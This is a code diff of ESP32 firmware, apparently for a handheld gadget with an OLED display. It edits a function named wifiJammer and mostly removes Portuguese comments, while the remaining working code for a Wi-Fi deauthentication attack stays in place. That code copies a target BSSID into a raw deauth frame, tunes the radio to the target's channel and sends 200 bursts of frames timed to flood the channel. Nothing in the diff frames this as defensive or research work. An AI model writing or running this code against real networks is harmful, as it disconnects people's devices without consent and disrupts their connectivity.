@@ -274,35 +274,29 @@ void wifiChannels() {
 
 void wifiJammer() {
   loading("WIFI", "Signal Jammer", 1000);
-
-  // Garante o desligamento de conexões ativas e limpa o estado do sniffer anterior
+    
   stopWifiSniffer();
   WiFi.mode(WIFI_STA);
   WiFi.disconnect(true, true);
   delay(100);
 
-  // CORREÇÃO 1: Preencher obrigatoriamente tanto o Source MAC (index 10) quanto o BSSID MAC (index 16)
   for (int i = 0; i < 6; i++) {
     deauth_packet[10 + i] = target_bssid[i]; // Source MAC
     deauth_packet[16 + i] = target_bssid[i]; // BSSID MAC
   }
 
-  // CORREÇÃO 2: Sintonizar o rádio do ESP32 explicitamente no canal do alvo
   esp_err_t chan_result = esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
   if (chan_result != ESP_OK) {
     page("WIFI JAMMER", "Channel Error", "Failed to lock CH");
     return;
   }
 
-  // Loop de execução visual do Jammer na tela OLED
   uint32_t lastRefresh = 0;
-  uint16_t burstCount = 200; // Quantidade total de rajadas a serem enviadas
+  uint16_t burstCount = 200; 
 
   for (uint16_t i = 0; i < burstCount; i++) {
-    // Envia o pacote bruto pelo canal configurado. O último parâmetro (true) gerencia o enfileiramento
     esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), true);
     
-    // Atualiza o display periodicamente para evitar travamento de interface visual
     if (millis() - lastRefresh >= 200) {
       uint8_t percent = (uint8_t)((i * 100UL) / burstCount);
       
@@ -326,8 +320,7 @@ void wifiJammer() {
       
       lastRefresh = millis();
     }
-    
-    // Delay de 15ms a 30ms é o ideal para inundar o canal de forma eficiente sem travar o ESP32
+
     delay(20);
   }
 
